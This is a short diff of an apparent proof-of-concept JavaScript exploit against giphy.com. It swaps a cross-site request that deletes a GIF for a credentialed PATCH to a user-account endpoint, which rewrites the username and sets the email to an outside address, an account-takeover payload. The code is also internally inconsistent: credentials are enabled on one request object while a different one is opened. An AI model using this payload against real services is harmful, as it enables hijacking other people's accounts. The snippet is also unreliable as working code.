@@ -1,8 +1,8 @@
 var http = new XMLHttpRequest();
 var xhr = new XMLHttpRequest();
-var url = 'https://giphy.com/ajax/gif/update/';
-var params = 'gif_id=dk8319804f0G5hbENe&key=delete_gif&value=true';
-http.open('POST', url, true);
+var url = 'https://giphy.com/api/v1/users/38283249/';
+var params = 'username=hello9089&display_name=&email=userchange@live.fr';
+http.open('PATCH', url, true);
 xhr.withCredentials = true;
 
 //Send the proper header information along with the request
